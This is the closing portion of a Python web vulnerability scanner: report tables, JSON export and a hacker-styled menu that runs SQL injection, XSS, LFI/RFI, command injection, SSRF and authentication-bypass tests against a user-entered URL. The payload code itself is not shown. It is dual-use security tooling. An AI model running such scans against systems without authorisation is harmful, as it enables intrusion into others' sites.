        console.print(f"[cyan]Title:[/cyan] {report['page_info'].get('title')}")
        console.print(f"[cyan]Server:[/cyan] {report['page_info'].get('server')}")
        console.print(f"[cyan]Response Time:[/cyan] {report['page_info'].get('response_time', 0):.2f}s")
        console.print(f"[cyan]Redirects:[/cyan] {report['page_info'].get('redirect_count', 0)}")
        
        
        summary_table = Table(title="Vulnerability Summary", box=box.ROUNDED)
        summary_table.add_column("Severity", style="bold")
        summary_table.add_column("Count", justify="right")
        
        for severity, count in report['severity_breakdown'].items():
            color = {
                'critical': 'red',
                'high': 'yellow',
                'medium': 'cyan',
                'low': 'green'
            }.get(severity, 'white')
            summary_table.add_row(f"[{color}]{severity.upper()}[/{color}]", f"[{color}]{count}[/{color}]")
        
        summary_table.add_row("[bold]TOTAL[/bold]", f"[bold]{report['total_vulnerabilities']}[/bold]")
        console.print(summary_table)
        
        
        if report['vulnerabilities']:
            vuln_table = Table(title="Detailed Vulnerabilities", box=box.ROUNDED)
            vuln_table.add_column("#", style="dim")
            vuln_table.add_column("Type", style="cyan")
            vuln_table.add_column("Severity", style="bold")
            vuln_table.add_column("Description")
            
            for idx, vuln in enumerate(report['vulnerabilities'], 1):
                severity = vuln.get('severity', 'Low')
                color = {
                    'Critical': 'red',
                    'High': 'yellow',
                    'Medium': 'cyan',
                    'Low': 'green'
                }.get(severity, 'white')
                
                vuln_table.add_row(
                    str(idx),
                    vuln['type'],
                    f"[{color}]{severity}[/{color}]",
                    vuln.get('description', 'No description')[:50] + ('...' if len(vuln.get('description', '')) > 50 else '')
                )
            
            console.print(vuln_table)
        else:
            console.print("\n[bold green]✓ No vulnerabilities detected![/bold green]")
            console.print("[dim]This might be a false negative - consider manual testing.[/dim]")
        
        console.print("\n" + "="*70 + "\n")
    
    def save_report(self, filename: str = 'scan_report.json') -> None:
        """Save report to JSON file"""
        report = self.generate_report()
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        console.print(f"[green]✓ Report saved to {filename}[/green]")


class UltimateHackerMenu:
    def __init__(self):
        self.running = True
        self.scan_history = []
    
    def run(self):
        """Run the menu with a sick opening effect"""
        # Clear screen
        os.system('cls' if os.name == 'nt' else 'clear')
        
        
        HackerAnimation.print_hacker_banner()
        MatrixEffect.matrix_rain(3)
        
        while self.running:
            console.print("[bold cyan]╔════════════════════════════════════════════╗[/bold cyan]")
            console.print("[bold cyan]║                WEB SCRAPER                 ║[/bold cyan]")
            console.print("[bold cyan]╠════════════════════════════════════════════╣[/bold cyan]")
            console.print("[bold cyan]║  [1] Full Advanced Scan                    ║[/bold cyan]")
            console.print("[bold cyan]║  [2] Custom Scan                           ║[/bold cyan]")
            console.print("[bold cyan]║  [3] View Scan History                     ║[/bold cyan]")
            console.print("[bold cyan]║  [4] About / Help                          ║[/bold cyan]")
            console.print("[bold cyan]║  [5] EXIT                                  ║[/bold cyan]")
            console.print("[bold cyan]╚════════════════════════════════════════════╝[/bold cyan]")
            
            choice = input(f"{Fore.CYAN}Enter choice > {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.full_scan()
            elif choice == '2':
                self.custom_scan()
            elif choice == '3':
                self.view_history()
            elif choice == '4':
                self.show_about()
            elif choice == '5':
                console.print("\n[bold red]Exiting scanner...[/bold red]")
                self.running = False
            else:
                console.print("[red]Invalid choice![/red]")
    
    def full_scan(self):
        """Run full advanced scan"""
        url = self.get_target_url()
        if not url:
            return
        
        console.print("\n[bold yellow] Starting FULL ADVANCED SCAN[/bold yellow]")
        
        scanner = AdvancedScanner(url, threads=20, timeout=10)
        if scanner.run_full_scan():
            scanner.print_report()
            
            save = input(f"\n{Fore.YELLOW}Save report? (y/n): {Style.RESET_ALL}").strip().lower()
            if save == 'y':
                filename = f"scan_{scanner.scan_id}.json"
                scanner.save_report(filename)
                self.scan_history.append({
                    'url': url,
                    'scan_id': scanner.scan_id,
                    'timestamp': scanner.scan_timestamp,
                    'vulnerabilities': len(scanner.vulnerabilities)
                })
        else:
            console.print("[red]Scan failed![/red]")
    
    def custom_scan(self):
        """Run custom scan with selected options"""
        url = self.get_target_url()
        if not url:
            return
        
        console.print("\n[bold cyan]Select scan modules:[/bold cyan]")
        modules = {
            'headers': ('Security Headers', True),
            'sqli': ('SQL Injection', True),
            'xss': ('XSS Testing', True),
            'lfi': ('LFI/RFI', True),
            'command': ('Command Injection', True),
            'ssrf': ('SSRF Testing', True),
            'auth': ('Authentication Bypass', True)
        }
        
        selected = {}
        for key, (name, default) in modules.items():
            response = input(f"{Fore.CYAN}Test {name}? (y/n) [{ 'y' if default else 'n'}]: {Style.RESET_ALL}").strip().lower()
            selected[key] = response != 'n' if response else default
        
        
        console.print("\n[bold yellow]Running custom scan...[/bold yellow]")
        scanner = AdvancedScanner(url, threads=10, timeout=10)
        
        
        if not scanner.fetch_page():
            console.print("[red]Failed to fetch target![/red]")
            return
        
        if selected['headers']:
            scanner.test_headers_security()
        if selected['sqli']:
            scanner.advanced_sql_injection_test()
        if selected['xss']:
            scanner.advanced_xss_test()
        if selected['lfi']:
            scanner.test_lfi_rfi()
        if selected['command']:
            scanner.test_command_injection()
        if selected['ssrf']:
            scanner.test_ssrf()
        if selected['auth']:
            scanner.test_authentication_bypass()
        
        scanner.generate_report()
        scanner.print_report()
    
    def get_target_url(self):
        """Get and validate target URL"""
        console.print("\n[bold cyan]Enter target URL:[/bold cyan]")
        url = input(f"{Fore.CYAN}> {Style.RESET_ALL}").strip()
        
        if not url:
            return None
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        return url
    
    def view_history(self):
        """View scan history"""
        if not self.scan_history:
            console.print("[yellow]No scan history yet![/yellow]")
            return
        
        table = Table(title="Scan History", box=box.ROUNDED)
        table.add_column("Scan ID", style="cyan")
        table.add_column("Target", style="green")
        table.add_column("Timestamp")
        table.add_column("Vulnerabilities", justify="right")
        
        for scan in self.scan_history:
            table.add_row(
                scan['scan_id'],
                scan['url'],
                scan['timestamp'][:19],
                str(scan['vulnerabilities'])
            )
        
        console.print(table)
    
    def show_about(self):
        """Show about information"""
        console.print("[bold cyan]╔════════════════════════════════════════════╗[/bold cyan]")
        console.print("[bold cyan]║              WEBSCRAPER                    ║[/bold cyan]")
        console.print("[bold cyan]╠════════════════════════════════════════════╣[/bold cyan]")
        console.print("[bold cyan]║               SCANNER                      ║[/bold cyan]")
        console.print("[bold cyan]║             Version 1.0                    ║[/bold cyan]")
        console.print("[bold cyan]║                                            ║[/bold cyan]")
        console.print("[bold cyan]║  Features:                                 ║[/bold cyan]")
        console.print("[bold cyan]║  • Advanced SQL Injection                  ║[/bold cyan]")
        console.print("[bold cyan]║  • Context-Aware XSS Testing               ║[/bold cyan]")
        console.print("[bold cyan]║  • LFI/RFI Vulnerability Detection         ║[/bold cyan]")
        console.print("[bold cyan]║  • Command Injection Analysis              ║[/bold cyan]")
        console.print("[bold cyan]║  • SSRF Testing                            ║[/bold cyan]")
        console.print("[bold cyan]║  • Authentication Bypass                   ║[/bold cyan]")
        console.print("[bold cyan]║  • Security Header Analysis                ║[/bold cyan]")
        console.print("[bold cyan]║  • CORS & Cookie Security Checks           ║[/bold cyan]")
        console.print("[bold cyan]║                                            ║[/bold cyan]")
        console.print("[bold cyan]║  [red]⚠ LEGAL WARNING:[/red]              ║[/bold cyan]")
        console.print("[bold cyan]║  Use only on systems you own or have       ║[/bold cyan]")
        console.print("[bold cyan]║  explicit permission to test!              ║[/bold cyan]")
        console.print("[bold cyan]╚════════════════════════════════════════════╝[/bold cyan]")
        
        input("\nPress Enter to continue...")

def main():
    """Main entry point with cool effect"""
    try:
        menu = UltimateHackerMenu()
        menu.run()
    except KeyboardInterrupt:
        console.print("\n\n[bold red]⚠ Scan interrupted by user[/bold red]")
        console.print("[dim]Gotta stay under the radar...[/dim]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]Fatal error: {e}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
